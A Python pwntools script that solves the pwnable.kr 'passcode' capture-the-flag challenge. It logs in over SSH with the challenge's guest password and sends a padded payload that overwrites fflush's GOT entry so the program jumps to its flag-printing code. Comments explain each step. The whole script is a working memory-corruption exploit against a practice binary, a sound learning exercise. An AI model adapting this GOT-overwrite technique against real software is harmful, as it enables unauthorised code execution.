from pwn import *

if __name__ == '__main__':
    # SSH into the machine to do the ctf.
    my_ssh = ssh("passcode", "pwnable.kr", password="guest", port=2222)
    # Run the executable.
    p = my_ssh.process(executable="./passcode")
    # Check for when we receive the line that contains " name : " because that is when we need to send input.
    recv = p.recvuntil(" name : ")
    # Print it so we can see it.
    print(recv.decode('utf-8'))
    # Send the payload. Pad with 96 A's and then send the little-endian address of fflush 
    # and a string containing the int value of the first assembly call after the if check before printing the flag.
    p.send('A'*96 + '\x14\xc0\x04\x08' + '134517391')
    # Send a new line - simulates pressing the enter button on the keyboard.
    p.send(b'\n')
    # Recv all the text that comes after our input.
    flag = p.recvall()
    # Split it by the new line byte indicator.
    flag_arr = flag.split(b'\n')
    for recv_text in flag_arr:
        # Print it all so it's all on new lines and easier to look at.
        print(recv_text)


